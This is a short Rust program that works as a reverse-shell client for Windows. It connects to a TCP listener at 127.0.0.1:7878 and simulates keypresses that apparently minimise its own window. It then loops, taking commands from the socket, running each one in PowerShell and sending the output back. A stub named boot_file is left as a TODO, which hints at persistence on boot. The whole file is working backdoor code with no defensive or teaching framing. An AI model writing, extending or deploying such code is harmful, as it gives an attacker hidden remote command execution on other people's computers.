use std::net::{TcpStream};
use std::io::{Read, Write};
use std::process::{Command};
use winput::{Vk};


//V
fn main() {
	//boot_file();
  	server_connect();
}

pub fn server_connect() {
	let mut stream = TcpStream::connect("127.0.0.1:7878").unwrap();

	winput::press(Vk::LeftWin);
	winput::press(Vk::DownArrow);
	winput::release(Vk::LeftWin);
	winput::release(Vk::DownArrow);

	loop {
	
		let mut buffer = [0; 1024];
		
		stream.read(&mut buffer).unwrap();
		let input = String::from_utf8_lossy(&buffer[..]).trim_matches(char::from(0)).to_string();

		println!("{}", input);


		//get output
		let output = Command::new("powershell")
			.arg(input)
			.output()
			.expect("No");


		//send output

		let noout: &str = "No Output";
		if output.stdout.len() == 0{
			let _ = stream.write_all(noout.as_bytes());
		}
		else {
			let _ = stream.write_all(&output.stdout);
		}
	}
}

pub fn boot_file(){
    //TODO

}
